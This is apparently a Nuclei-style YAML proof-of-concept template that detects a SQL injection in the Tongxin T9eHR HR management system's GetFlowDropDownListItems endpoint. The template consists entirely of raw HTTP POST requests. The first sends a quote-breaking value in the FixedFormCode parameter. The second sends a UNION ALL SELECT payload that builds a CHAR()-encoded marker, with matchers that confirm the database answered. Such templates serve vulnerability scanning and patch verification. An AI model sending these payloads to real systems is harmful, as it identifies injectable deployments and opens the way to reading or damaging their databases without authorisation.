id: poc-yaml-tongxine-t9ehr-getdropdownlistitems-sqli

info:
  name: 同鑫T9eHR信息化管理系统 GetDropDownListItems SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    同鑫T9eHR信息化管理系统中存在SQL注入漏洞，可以通过特定请求导致敏感信息泄露或数据库损坏。

http:
  - raw:
      - |
        POST /Common/GetFlowDropDownListItems HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=utf-8

        FixedFormCode=1%27
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "有语法错误"
          - "引号不完整"
          - "\"success\":false"
      - type: status
        status:
          - 200

  - raw:
      - |
        POST /Common/GetFlowDropDownListItems HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=utf-8

        FixedFormCode=1%27+UNION+ALL+SELECT+NULL%2CCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28109%29%2BCHAR%28107%29%2BCHAR%2886%29%2BCHAR%2897%29%2BCHAR%2897%29%2BCHAR%28115%29%2BCHAR%28107%29%2BCHAR%2879%29%2BCHAR%28111%29%2BCHAR%2898%29%2BCHAR%2871%29%2BCHAR%2871%29--+AHRN
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "qjqvqmkVaaskOobGG"
          - "option"
      - type: word
        part: body
        negative: true
        words:
          - "<html"
      - type: status
        status:
          - 200
